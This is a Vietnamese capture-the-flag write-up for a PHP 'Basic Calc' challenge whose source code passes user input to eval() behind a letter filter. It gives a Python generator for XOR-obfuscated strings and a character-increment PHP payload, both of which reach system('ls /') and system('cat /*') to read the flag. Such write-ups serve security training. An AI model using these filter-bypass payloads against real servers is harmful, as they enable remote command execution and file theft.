---
description: cc
---

# Basic Calc

‌

## Cách1 : Dùng Xor <a id="cach1-dung-xor"></a>

‌

Ta có source code như sau

```text
<h2>Welcome to da Basic Calc</h2><form action="/" method="POST">    Enter da equation : <br>    <input type="text" name="eq"><br></form>​<?php​if (isset($_POST["eq"])){        $eq = $_POST["eq"];​    if(preg_match("/[A-Za-z`]+/",$eq)){        die("BAD.");    }    echo "Result: ";    eval("echo " . $eq . " ;");}else{  echo highlight_file('index.php',true);  }​?>
```

‌

Ta viết payload encode xor như sau

```text
string = ["system"  , "ls" , "cat" , "flagggg.txt"]char = "!#$%&'()*,-./:;<=>?@[]^_{|}~"for string_code in string:    obfuscate_str_final = ""    for i in string_code:        is_found_obfs = False        for j in char:            for k in char:                if ord(j)^ord(k) == ord(i):                    obfuscate_str_final += ".('%s'^'%s')" %(j,k)                    is_found_obfs = True                if is_found_obfs:                    break            if is_found_obfs:                break        if not is_found_obfs:            obfuscate_str_final +=".'%s'" % i    print("%s = %s" %(string_code , obfuscate_str_final[1:]))
```

```text
(system)(ls /) = (('('^'[').('$'^']').('('^'[').(')'^']').('%'^'@').('-'^'@'))((','^'@').('('^'[')." "."/")
```

​![](https://gblobscdn.gitbook.com/assets%2F-Mis_xwrnxbC4COg9dby%2F-MisbF-a-qZfsQOIxeMd%2F-MisdkT68Op9Cz55fPqh%2Fimage.png?alt=media&token=4e2c97ca-2ac9-4491-9ea2-6d3979f1f5b6)‌

Ta thấy có file flagggg.txt là file chứa flag sử dụng code trên ta có:

```text
(system)(cat /*) = (('('^'[').('$'^']').('('^'[').(')'^']').('%'^'@').('-'^'@'))(('#'^'@').('!'^'@').(')'^']')." "."/*")
```

​![](https://gblobscdn.gitbook.com/assets%2F-Mis_xwrnxbC4COg9dby%2F-MisbF-a-qZfsQOIxeMd%2F-Mise7fr-OwdjtOszf1H%2Fimage.png?alt=media&token=133dee02-604b-4c2f-9a30-6b76b2cde794)‌

## Cách 2: <a id="cach-2"></a>

‌

Ý tưởng: [https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)​‌

Nhớ đọc cái trên‌

Dùng URLENCODE rồi quăng code vào burpsuite để chạy

```text
<?php$_=[];$_=@"$_"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];​//echo $____;// GO TO SYSTEM$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____=$__; //S$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__;//SY$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__; //SYS$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__; //SYST$__=$_;$__++;$__++;$__++;$__++;$_____.=$__; //SYSTE$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__; //SYSTEM//echo $_____;//GO TO STRTOLOWER$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______=$__; //S$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______.=$__; //ST$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______.=$__; //STR$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______.=$__; //STRT$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______.=$__;  //STRTO$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______.=$__;  //STRTOL$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______.=$__; //STRTOLO$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______.=$__;  //STRTOLOW$__=$_;$__++;$__++;$__++;$__++;$______.=$__; //STRTOLOWE$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______.=$__; //STRTOLOWER​$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__________.=$__; //L$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__________.=$__;//LS​$_____($______($__________." "."/"))//system(strolower(ls "/"))​?>
```

​![](https://gblobscdn.gitbook.com/assets%2F-Mis_xwrnxbC4COg9dby%2F-MisbF-a-qZfsQOIxeMd%2F-Misg-Obl_1Zrg9ItuXs%2Fimage.png?alt=media&token=7dbb5407-b5e3-4818-b420-fd7cfb2ec27a)‌

Tiếp theo ta cat file flagggg.txt

```text
<?php$_=[];$_=@"$_"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];​//echo $____;// GO TO SYSTEM$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____=$__; //S$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__;//SY$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__; //SYS$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__; //SYST$__=$_;$__++;$__++;$__++;$__++;$_____.=$__; //SYSTE$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_____.=$__; //SYSTEM//echo $_____;//GO TO STRTOLOWER$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______=$__; //S$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______.=$__; //ST$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______.=$__; //STR$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______.=$__; //STRT$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______.=$__;  //STRTO$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______.=$__;  //STRTOL$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______.=$__; //STRTOLO$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______.=$__;  //STRTOLOW$__=$_;$__++;$__++;$__++;$__++;$______.=$__; //STRTOLOWE$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______.=$__; //STRTOLOWER//cat$__=$_;$__++;$__++;$________.=$__;//c$________.=$_;//ca$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$________.=$__;//cat​​​​$_____($______($________." "."/*"))//system(strolower(cat /*))​?>
```

​![](https://gblobscdn.gitbook.com/assets%2F-Mis_xwrnxbC4COg9dby%2F-MisbF-a-qZfsQOIxeMd%2F-MisgEk0STG32OYnEzsM%2Fimage.png?alt=media&token=50522ce7-5146-4e09-b297-2a76da973e5e)‌

Result: ArrayGrabCON{b4by\_php\_f0r\_y0u}

